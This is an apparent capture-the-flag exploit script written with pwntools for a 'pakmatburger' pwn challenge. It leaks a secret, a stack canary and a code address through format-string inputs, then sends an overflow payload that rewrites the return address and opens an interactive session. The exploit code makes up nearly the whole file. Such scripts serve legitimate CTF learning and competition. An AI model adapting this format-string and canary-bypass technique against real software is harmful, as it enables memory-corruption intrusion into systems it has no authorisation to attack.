from pwn import *
import os
import re

context.arch = 'amd64'
pty = process.PTY
is_local = False
is_remote = False

elf = ELF("/home/kali/CTF/WargamesMy/Pwn/pakmatburger/challenge/pakmat_burger")
if len(sys.argv) == 1:
    is_local = True
    p = process(elf.path, stdin=pty, stdout=pty)

elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)



# Grab secret the first time
print(p.recvuntilS("name:"))
p.sendline(b"%6$s")
secret = p.recvuntil(",")[:-1].decode().split()[1]
log.info("Secret " + secret)
p.close()

# Run again:
# p = process(elf.path, stdin=pty, stdout=pty)
p = remote(host,port)
debug(cmd='''
b *main+373
''')

print(p.recvuntilS("name:"))
p.sendline(b"%13$p.%17$p")
leak = p.recvuntil(",")[:-1].decode().split()[1].split(".")
canary = leak[0]
main_leak = leak[1]
pop_rdi = 0x000000000000101a



log.info("Canary " + canary)
log.info("Main " + main_leak)
canary = int(canary, 16)
main_leak = int(main_leak, 16)
ret_offset = main_leak + 394
secret_offset = main_leak - 22
log.info("Ret " + f"0x{ret_offset:016x}")
log.info("Secret Order " + f"0x{secret_offset:016x}")
p.sendline(secret)
print(p.recvuntilS("order?"))
p.sendline(b"Test")
print(p.recvuntilS("soon:"))

payload = b"A"*37 + p64(canary) + b"A"*8 + p64(ret_offset) + p64(secret_offset)  # Found 37 through gdb and 8 bytes of padding through below code.

p.sendline(payload)
# """ 
# Code For finding offset from canary til ret. it was 8 
# p.wait()
# core = p.corefile
# stack = core.rsp
# log.info("rsp = %#x", stack)
# pattern = core.read(stack, 4)
# rip_offset = cyclic_find(pattern)
# log.info("rip offset is %d", rip_offset)
# """

p.interactive()
